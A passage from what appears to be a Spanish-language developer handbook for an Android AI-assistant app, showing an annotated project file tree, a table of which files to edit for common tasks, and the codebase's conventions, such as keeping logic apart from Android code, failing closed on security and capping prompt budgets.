│       │       │   ├── PipelineRouter.kt        Tier 1
│       │       │   ├── ActionGuard.kt           heurística (NO es frontera de seguridad)
│       │       │   ├── TaskHistoryStore.kt      memoria prio 4
│       │       │   ├── llm/                     OpenAI / Anthropic / Local
│       │       │   └── skill/                   Tier 2
│       │       ├── assistant/               recordatorios, alarmas, Vosk, TTS
│       │       ├── automation/              ★ entrypoints externos + token
│       │       ├── car/                     Android Auto
│       │       ├── channel/                 Telegram / Discord / WeChat
│       │       │   └── auth/                ★ vinculación de propietario
│       │       ├── conversation/            ★ ConversationRepository (timeline)
│       │       ├── emergency/               ★ modo emergencia + cámara
│       │       ├── memory/                  ★ MemoryHub y sus stores
│       │       │   ├── JsonListStore.kt         ★ base común de los stores
│       │       │   ├── MemoryHub.kt             ensamblado por prioridad
│       │       │   ├── MemoryInventory.kt       ★ vista/borrado de privacidad
│       │       │   ├── UserProfile.kt           prio 1 (tope 600 chars)
│       │       │   ├── UserMemoryStore.kt       prio 2
│       │       │   ├── ConversationMemory.kt    prio 5
│       │       │   └── SemanticSearch.kt
│       │       ├── perception/              captura, OCR, accessibility tree
│       │       ├── proactive/               asistente proactivo (memoria propia)
│       │       ├── security/                SecurityPolicy, scanner de apps
│       │       ├── server/                  ★ ConfigServer + política
│       │       ├── service/                 accesibilidad, notificaciones, foreground
│       │       ├── tool/
│       │       │   ├── ToolRegistry.kt      ★ gate de riesgo aquí
│       │       │   ├── BaseTool.kt
│       │       │   ├── guard/               ★ ToolRiskPolicy, consentimiento, contexto
│       │       │   └── impl/                ~142 archivos de tools
│       │       ├── ui/
│       │       ├── cards/                   ★ contrato de tarjetas, PURO (sin Android)
│       │       │   ├── AssistCard.kt            Weather · Place · Offer · Link
│       │       │   ├── AssistCardCodec.kt       encode/decode; decode nunca lanza
│       │       │   ├── MapTiles.kt              Web Mercator + geo: URI
│       │       │   └── PriceText.kt             precio verbatim, exige moneda
│       │       ├── ui/
│       │       │   ├── cards/                ★ renderizado de las tarjetas
│       │       │   │   ├── AssistCardViews.kt    las 4 tarjetas + animaciones
│       │       │   │   ├── MiniMap.kt            tesela OSM + pin + atribución
│       │       │   │   ├── TileImageLoader.kt    OkHttp + caché; User-Agent obligatorio
│       │       │   │   └── AssistCardSkin.kt     paleta inyectada (panel vs chat)
│       │       │   ├── chat/                ★ pantalla de chat (modernizada)
│       │       │   │   ├── ChatScreen.kt        todo el Compose + menú "+" del composer
│       │       │   │   ├── ChatMarkdown.kt      ★ parser puro (72 tests, con tablas)
│       │       │   │   ├── ChatMarkdownText.kt  ★ renderizador
│       │       │   │   ├── ChatMessage.kt       modelo + Role.CARDS
│       │       │   │   └── ThemeManager.kt      los 10 temas + BlackClawColors
│       │       │   ├── assist/              ★ panel del botón de power
│       │       │   ├── design/              ★ sistema de diseño
│       │       │   ├── assistant/           ★ pantalla del asistente (rehecha)
│       │       │   ├── settings/            ★ ChannelConfigScreen, MemoryPrivacyActivity
│       │       │   └── adb/                 ★ Modo Pro + consentimiento shell
│       │       └── utils/                   KVUtils (MMKV), XLog, ProcessUtils
│       └── test/java/com/blackclaw/android/   66 archivos, 726 tests
└── gradle/libs.versions.toml       catálogo de versiones
```

★ = tocado o creado en esta sesión.

## Anexo B — Dónde tocar según la tarea

| Quiero… | Archivo |
|---|---|
| Añadir una tool | `tool/impl/` + registrar en `ToolRegistry.registerAllTools` |
| Cambiar quién puede ejecutar una tool | `tool/guard/ToolRiskPolicy.kt` |
| Que una tool devuelva una tarjeta | `ToolResult.successWithCards(...)` con `AssistCardCodec.encode` |
| Añadir un tipo de tarjeta | `cards/AssistCard.kt` + `AssistCardCodec.kt` + un renderizador en `ui/cards/AssistCardViews.kt` |
| Cambiar cómo se ve una tarjeta | `ui/cards/AssistCardViews.kt`; los colores en `AssistCardSkin.kt` |
| Cambiar el mini mapa | `ui/cards/MiniMap.kt` (dibujo) y `cards/MapTiles.kt` (matemática, pura) |
| Tocar la detección de precios | `cards/PriceText.kt` — devuelve verbatim, nunca reformatea |
| Añadir un test de layout | `src/test/.../ui/LayoutRegressionTest.kt` (mide con Robolectric, sin dispositivo) |
| Cambiar el prompt del sistema (tareas) | `agent/DefaultAgentService.kt` ~línea 574 |
| Cambiar el prompt del chat | `ui/chat/ChatSessionController.sharedContextSuffix` |
| Añadir/quitar memoria del prompt | `memory/MemoryHub.assemble` |
| Añadir un store persistido nuevo | heredar de `memory/JsonListStore.kt`, **no** escribir JSON a mano |
| Que un dato nuevo sea visible/borrable por el usuario | añadir categoría en `memory/MemoryInventory.kt` (la pantalla se actualiza sola) |
| Cambiar cómo se formatea la respuesta del modelo | `ui/chat/ChatMarkdown.kt` para el significado, `ChatMarkdownText.kt` para el aspecto |
| Añadir un color al chat | **no** hardcodear: añadir slot a `BlackClawColors` + `ThemeManager.toComposeColors()`, o derivarlo de uno existente (hay 10 temas) |
| Cambiar duraciones/easings de animación | `ui/design/ClawMotion.kt`; lo decorativo debe consultar `ClawAnimation.reduceMotion()` |
| Añadir una ubicación donde buscar `.zim` | `knowledge/ZimDiscovery.kt` (`NAMED_FOLDERS` / `searchRoots`), **no** subir a ciegas el `maxDepth` |
| Cambiar colores/animaciones | `ui/design/ClawPalette.kt`, `ClawMotion.kt` |
| Añadir un secreto que el usuario copie | `ui/design/ClawSecretCard.kt` |
| Tocar canales remotos | `channel/` + **respetar** el orden del gate (§6) |
| Cambiar reglas de red | `res/xml/network_security_config.xml` + `server/ConfigServerPolicy.kt` (mantener ambas capas de acuerdo) |

## Anexo C — Convenciones que sigue este código

Se aplicaron de forma consistente en los archivos nuevos; conviene mantenerlas.

1. **Lógica pura separada de Android.** Cada decisión con consecuencias vive en un
   `object` sin dependencias de Android (`*Policy`, `*Model`, `*Tuning`, `*Summary`) y se
   testea en la JVM. La clase con Android alrededor solo adapta tipos. Razón práctica
   además de la teórica: `android.util.Size`/`Range` son stubs en tests unitarios y
   devuelven 0, así que la lógica que los use directamente **no se puede testear**.
2. **Los comentarios explican el POR QUÉ**, en particular el modo de fallo que se está
   evitando. El "qué" ya lo dice el código.
3. **Fallar cerrado** en seguridad: un origen sin determinar se trata igual que remoto.
4. **Los tests fijan el contrato**, no la implementación. Los de seguridad existen porque
   una regresión permisiva es invisible hasta que se explota.
5. **Presupuestos con tope** en todo lo que entra al prompt. Sin tope, el sistema se
   degrada precisamente cuando más ha aprendido.
